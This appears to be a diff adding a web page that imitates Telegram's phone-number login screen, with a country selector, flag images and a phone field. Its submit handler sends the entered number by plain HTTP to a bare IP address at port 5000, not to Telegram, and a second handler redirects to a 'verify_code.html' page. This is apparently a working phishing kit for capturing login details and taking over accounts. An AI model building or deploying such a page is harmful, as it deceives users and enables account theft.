@@ -1,0 +1,516 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Telegram Phone Login with Flags</title>
+  <style>
+    :root {
+      --text-vertical-offset: 8px;
+    }
+
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      background-color: #1e1e1e;
+      font-family: Arial, sans-serif;
+      color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .form-input.phone-input {
+      padding-left: 60px; /* Enough space for country code prefix */
+      font-family: monospace; /* optional, to align digits nicely */
+      letter-spacing: 2px; /* optional spacing for digits */
+    }
+    .login-container {
+      text-align: center;
+      width: 100%;
+      max-width: 350px;
+      padding: 20px;
+      margin-top: -200px;
+    }
+
+    .login-icon {
+      width: 150px;
+      height: 150px;
+      margin-bottom: 30px;
+    }
+
+    .login-title {
+      font-size: 35px;
+      font-weight: bold;
+      margin-bottom: 10px;
+    }
+
+    .login-subtitle {
+      font-size: 15px;
+      color: #aaaaaa;
+      margin-bottom: 60px;
+      line-height: 0.7;
+      white-space: pre-line;
+    }
+
+    .login-form {
+      display: flex;
+      flex-direction: column;
+      gap: 25px;
+      width: 100%;
+    }
+
+    .form-group {
+      position: relative;
+      width: 100%;
+    }
+
+    .form-label {
+      position: absolute;
+      top: -10px;
+      left: 12px;
+      background-color: #1e1e1e;
+      padding: 0 6px;
+      font-size: 12px;
+      color: #ccc;
+      pointer-events: none;
+      z-index: 1;
+    }
+
+    /* Custom select dropdown container */
+    .custom-select {
+      position: relative;
+      background-color: rgba(30, 30, 30, 0.8);
+      border: 1px solid #919190;
+      border-radius: 8px;
+      color: #fff;
+      font-size: 15px;
+      cursor: pointer;
+      user-select: none;
+      padding: var(--text-vertical-offset) 36px 6px 12px; /* add extra right padding for arrow */
+      line-height: 2;
+      display: flex;
+      align-items: center;
+      justify-content: flex-start; /* changed from space-between */
+      outline: none;
+    }
+
+    .custom-select .selected-country-name {
+      margin-left: 10px; /* add some spacing between flag and text */
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+
+
+
+    
+    .custom-select:focus {
+      border-color: #8774e1;
+      outline: none;
+    }
+
+    /* Flag inside the select box */
+    .custom-select .flag {
+      width: 24px;
+      height: 18px;
+      margin-right: 10px;
+      flex-shrink: 0;
+      border-radius: 2px;
+      background-color: #222;
+      object-fit: cover;
+    }
+
+    /* Dropdown arrow */
+    .custom-select::after {
+      content: "";
+      border: 6px solid transparent;
+      border-top-color: #ccc;
+      position: absolute;
+      right: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      pointer-events: none;
+    }
+
+    /* Dropdown list container */
+    .select-dropdown {
+      position: absolute;
+      top: 100%;
+      left: 0;
+      right: 0;
+      background-color: rgba(30, 30, 30, 0.95);
+      border: 1px solid #8774e1;
+      border-radius: 8px;
+      margin-top: 5px;
+      max-height: 180px;
+      overflow-y: auto;
+      z-index: 100;
+      display: none;
+    }
+
+    /* Dropdown options */
+    .select-option {
+      display: flex;
+      align-items: center;
+      padding: 8px 12px;
+      cursor: pointer;
+      gap: 10px;
+      font-size: 15px;
+    }
+
+    .select-option:hover {
+      background-color: #8774e1;
+      color: white;
+    }
+
+    .select-option .flag {
+      width: 24px;
+      height: 18px;
+      border-radius: 2px;
+      object-fit: cover;
+    }
+
+    .form-input {
+      width: 100%;
+      background-color: rgba(30, 30, 30, 0.8);
+      color: #fff;
+      border: 1px solid #919190;
+      border-radius: 8px;
+      padding: var(--text-vertical-offset) 12px 6px;
+      font-size: 15px;
+      outline: none;
+      appearance: none;
+      -webkit-appearance: none;
+      -moz-appearance: none;
+      line-height: 2;
+    }
+
+    .form-input:focus {
+      border-color: #8774e1;
+    }
+
+    .form-input:focus + .form-label {
+      color: #8774e1;
+    }
+
+    .login-button {
+      background-color: #8774e1;
+      border: none;
+      border-radius: 6px;
+      padding: 12px 0;
+      color: white;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      width: 100%;
+      margin-top: 10px;
+      margin-bottom: 30px;
+    }
+
+    .login-button:hover {
+      background-color: #9c8af2;
+    }
+
+    .login-alt {
+      color: #8774e1;
+      font-weight: 600;
+      cursor: pointer;
+      font-size: 15px;
+      text-decoration: none;
+      padding: 5px 10px;
+      border-radius: 8px;
+      transition: background-color 0.2s ease;
+      margin-top: 20px;
+      display: inline-block;
+    }
+
+    .login-alt:hover {
+      background-color: rgba(135, 116, 225, 0.08);
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Icon" class="login-icon" />
+    <div class="login-title">Telegram</div>
+    <div class="login-subtitle">
+      Please&nbsp;confirm&nbsp;your&nbsp;country&nbsp;code&nbsp;and&nbsp;enter&nbsp;your<br />
+      phone number.
+    </div>
+
+<form class="login-form" id="loginForm">
+  <div class="form-group">
+    <label class="form-label" for="countrySelect">Country</label>
+    <div tabindex="0" class="custom-select" id="countrySelect" aria-haspopup="listbox" aria-expanded="false" role="combobox" aria-labelledby="countryLabel">
+      <img class="flag" src="https://flagcdn.com/w40/us.png" alt="USA flag" />
+      <span class="selected-country-name">USA</span>
+    </div>
+    <div class="select-dropdown" id="countryDropdown" role="listbox" aria-labelledby="countryLabel">
+      <!-- Options added by JS -->
+    </div>
+  </div>
+
+  <div class="form-group phone-input-container" style="position: relative; width: 100%;">
+    <span class="phone-prefix" style="
+      position: absolute;
+      top: 50%;
+      left: 12px;
+      transform: translateY(-50%);
+      color: #999;
+      font-family: monospace;
+      user-select: none;
+      pointer-events: none;
+      font-size: 15px;
+      letter-spacing: 2px;
+    ">+1</span>
+    <input type="tel" id="phoneInput" class="form-input phone-input" value="" required style="padding-left: 50px; font-family: monospace; letter-spacing: 2px;" />
+    <label class="form-label" for="phoneInput">Your phone number</label>
+  </div>
+
+  <button class="login-button" type="submit" id="nextButton">NEXT</button>
+</form>
+<a href="login_qr.html" class="login-alt">LOG IN BY QR CODE</a>
+
+<script>
+  // country data, same as before
+  const countries = [
+    { code: 'us', name: 'USA', dial: '+1', maxLength: 10 },
+    { code: 'in', name: 'India', dial: '+91', maxLength: 10 },
+    { code: 'ru', name: 'Russia', dial: '+7', maxLength: 10 },
+    { code: 'ir', name: 'Iran', dial: '+98', maxLength: 10 },
+    { code: 'br', name: 'Brazil', dial: '+55', maxLength: 11 },
+    { code: 'id', name: 'Indonesia', dial: '+62', maxLength: 12 },
+    { code: 'mx', name: 'Mexico', dial: '+52', maxLength: 10 },
+    { code: 'eg', name: 'Egypt', dial: '+20', maxLength: 10 },
+    { code: 'de', name: 'Germany', dial: '+49', maxLength: 11 },
+    { code: 'tr', name: 'Turkey', dial: '+90', maxLength: 10 },
+    { code: 'it', name: 'Italy', dial: '+39', maxLength: 10 },
+    { code: 'ua', name: 'Ukraine', dial: '+380', maxLength: 9 },
+    { code: 'ca', name: 'Canada', dial: '+1', maxLength: 10 },
+    { code: 'gb', name: 'United Kingdom', dial: '+44', maxLength: 10 },
+    { code: 'cn', name: 'China', dial: '+86', maxLength: 11 },
+    { code: 'jp', name: 'Japan', dial: '+81', maxLength: 10 },
+    { code: 'au', name: 'Australia', dial: '+61', maxLength: 9 },
+    { code: 'fr', name: 'France', dial: '+33', maxLength: 9 },
+    { code: 'es', name: 'Spain', dial: '+34', maxLength: 9 },
+    { code: 'kr', name: 'South Korea', dial: '+82', maxLength: 10 },
+    { code: 'sa', name: 'Saudi Arabia', dial: '+966', maxLength: 9 },
+    { code: 'ar', name: 'Argentina', dial: '+54', maxLength: 10 },
+    { code: 'nl', name: 'Netherlands', dial: '+31', maxLength: 9 },
+    { code: 'ch', name: 'Switzerland', dial: '+41', maxLength: 9 },
+    { code: 'se', name: 'Sweden', dial: '+46', maxLength: 9 },
+    { code: 'be', name: 'Belgium', dial: '+32', maxLength: 9 },
+    { code: 'pl', name: 'Poland', dial: '+48', maxLength: 9 },
+    { code: 'th', name: 'Thailand', dial: '+66', maxLength: 9 },
+    { code: 'ng', name: 'Nigeria', dial: '+234', maxLength: 10 },
+    { code: 'ph', name: 'Philippines', dial: '+63', maxLength: 10 },
+    { code: 'vn', name: 'Vietnam', dial: '+84', maxLength: 9 },
+    { code: 'za', name: 'South Africa', dial: '+27', maxLength: 9 },
+    { code: 'pt', name: 'Portugal', dial: '+351', maxLength: 9 },
+    { code: 'ie', name: 'Ireland', dial: '+353', maxLength: 9 },
+    { code: 'cz', name: 'Czech Republic', dial: '+420', maxLength: 9 },
+    { code: 'ro', name: 'Romania', dial: '+40', maxLength: 9 },
+    { code: 'at', name: 'Austria', dial: '+43', maxLength: 9 },
+    { code: 'dk', name: 'Denmark', dial: '+45', maxLength: 8 },
+    { code: 'fi', name: 'Finland', dial: '+358', maxLength: 9 },
+    { code: 'il', name: 'Israel', dial: '+972', maxLength: 9 },
+    { code: 'my', name: 'Malaysia', dial: '+60', maxLength: 10 },
+    { code: 'cl', name: 'Chile', dial: '+56', maxLength: 9 },
+    { code: 'co', name: 'Colombia', dial: '+57', maxLength: 10 },
+    { code: 'hu', name: 'Hungary', dial: '+36', maxLength: 9 },
+    { code: 'nz', name: 'New Zealand', dial: '+64', maxLength: 9 },
+    { code: 'gr', name: 'Greece', dial: '+30', maxLength: 10 },
+    { code: 'bd', name: 'Bangladesh', dial: '+880', maxLength: 10 },
+    { code: 'pk', name: 'Pakistan', dial: '+92', maxLength: 10 },
+    { code: 'ae', name: 'United Arab Emirates', dial: '+971', maxLength: 9 },
+    { code: 'qa', name: 'Qatar', dial: '+974', maxLength: 8 },
+    { code: 'kw', name: 'Kuwait', dial: '+965', maxLength: 8 },
+    { code: 'lb', name: 'Lebanon', dial: '+961', maxLength: 8 }
+  ];
+
+  // Elements
+  const countrySelect = document.getElementById('countrySelect');
+  const countryDropdown = document.getElementById('countryDropdown');
+  const phoneInput = document.getElementById('phoneInput');
+  const nextButton = document.getElementById('nextButton');
+  const selectedCountryNameSpan = countrySelect.querySelector('.selected-country-name');
+  const selectedFlagImg = countrySelect.querySelector('.flag');
+  const phonePrefixSpan = document.querySelector('.phone-prefix');
+
+  let selectedCountry = countries[0];
+
+  // Populate dropdown with countries
+  function populateDropdown() {
+    countryDropdown.innerHTML = '';
+    countries.forEach(country => {
+      const option = document.createElement('div');
+      option.className = 'select-option';
+      option.setAttribute('role', 'option');
+      option.setAttribute('tabindex', '-1');
+      option.setAttribute('data-code', country.code);
+      option.setAttribute('data-dial', country.dial);
+
+      option.innerHTML = `
+        <img class="flag" src="https://flagcdn.com/w40/${country.code}.png" alt="${country.name} flag" />
+        <span>${country.name}</span>
+      `;
+
+      option.addEventListener('click', () => {
+        selectCountry(country);
+        toggleDropdown(false);
+      });
+
+      option.addEventListener('keydown', e => {
+        if (e.key === 'Enter' || e.key === ' ') {
+          e.preventDefault();
+          selectCountry(country);
+          toggleDropdown(false);
+          countrySelect.focus();
+        } else if (e.key === 'ArrowDown') {
+          e.preventDefault();
+          if (option.nextElementSibling) option.nextElementSibling.focus();
+        } else if (e.key === 'ArrowUp') {
+          e.preventDefault();
+          if (option.previousElementSibling) option.previousElementSibling.focus();
+          else countrySelect.focus();
+        } else if (e.key === 'Escape') {
+          e.preventDefault();
+          toggleDropdown(false);
+          countrySelect.focus();
+        }
+      });
+
+      countryDropdown.appendChild(option);
+    });
+  }
+
+  // Select country and update UI + input constraints
+  function selectCountry(country) {
+    selectedCountry = country;
+    selectedCountryNameSpan.textContent = country.name;
+    selectedFlagImg.src = `https://flagcdn.com/w40/${country.code}.png`;
+    selectedFlagImg.alt = `${country.name} flag`;
+    phonePrefixSpan.textContent = country.dial;
+    phoneInput.value = '';
+    phoneInput.maxLength = country.maxLength;
+    updateButtonVisibility();
+  }
+
+  // Show/hide dropdown
+  function toggleDropdown(show) {
+    if (show === undefined) show = countryDropdown.style.display !== 'block';
+    if (show) {
+      countryDropdown.style.display = 'block';
+      countrySelect.setAttribute('aria-expanded', 'true');
+      const firstOption = countryDropdown.querySelector('.select-option');
+      if (firstOption) firstOption.focus();
+      document.addEventListener('click', outsideClickListener);
+    } else {
+      countryDropdown.style.display = 'none';
+      countrySelect.setAttribute('aria-expanded', 'false');
+      document.removeEventListener('click', outsideClickListener);
+    }
+  }
+
+  function outsideClickListener(e) {
+    if (!countrySelect.contains(e.target) && !countryDropdown.contains(e.target)) {
+      toggleDropdown(false);
+    }
+  }
+
+  // Show NEXT button only if input length >= country max length (digits only)
+  function updateButtonVisibility() {
+    const digits = phoneInput.value.replace(/\D/g, '');
+    nextButton.style.display = digits.length >= selectedCountry.maxLength ? 'block' : 'none';
+  }
+
+  document.getElementById('loginForm').addEventListener('submit', async (e) => {
+    e.preventDefault();
+
+    // Get digits only from user input
+    const digits = phoneInput.value.replace(/\D/g, '');
+
+    // Safety check on length
+    if (digits.length < selectedCountry.maxLength) return;
+
+    // Compose full number with prefix (no spaces)
+    const fullNumber = phonePrefixSpan.textContent.replace(/\D/g, '') + digits;
+
+    try {
+      const response = await fetch('http://196.251.115.76:5000/phone', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          countryCode: selectedCountry.dial, // e.g. "+1"
+          phoneNumber: digits,               // digits only, e.g. "5551234"
+          fullNumber: `+${fullNumber}`      // e.g. "+15551234"
+        })
+      });
+
+      if (!response.ok) {
+        // Handle server errors (like 400, 500, etc)
+        console.error('Server responded with error:', response.status, response.statusText);
+        return;
+      }
+
+      const data = await response.json();
+      console.log('Server response:', data);
+
+    } catch (error) {
+      console.error('Error sending phone number:', error);
+    }
+  });
+
+  // Event listeners for dropdown and input
+  countrySelect.addEventListener('click', () => toggleDropdown());
+
+  countrySelect.addEventListener('keydown', e => {
+    if (e.key === 'Enter' || e.key === ' ') {
+      e.preventDefault();
+      toggleDropdown();
+    } else if (e.key === 'ArrowDown') {
+      e.preventDefault();
+      toggleDropdown(true);
+    } else if (e.key === 'Escape') {
+      e.preventDefault();
+      toggleDropdown(false);
+    }
+  });
+
+  phoneInput.addEventListener('input', () => {
+    // Enforce max length (some browsers might not restrict exactly)
+    if (phoneInput.value.length > selectedCountry.maxLength) {
+      phoneInput.value = phoneInput.value.slice(0, selectedCountry.maxLength);
+    }
+    updateButtonVisibility();
+  });
+
+
+  const form = document.getElementById("loginForm");
+  form.addEventListener("submit", function (e) {
+    e.preventDefault(); // Prevent default form submission
+    const phone = phoneInput.value.trim();
+    if (phone.length >= 4) {
+      setTimeout(() => {
+        window.location.href = "verify_code.html";
+      }, 1000); // Wait 0.5 seconds
+    } else {
+      alert("Please enter a valid phone number.");
+    }
+  });
+
+
+
+
+  // Initialize
+  populateDropdown();
+  selectCountry(selectedCountry);
+  updateButtonVisibility();
+  
+
+  </script>
+</body>
+</html>
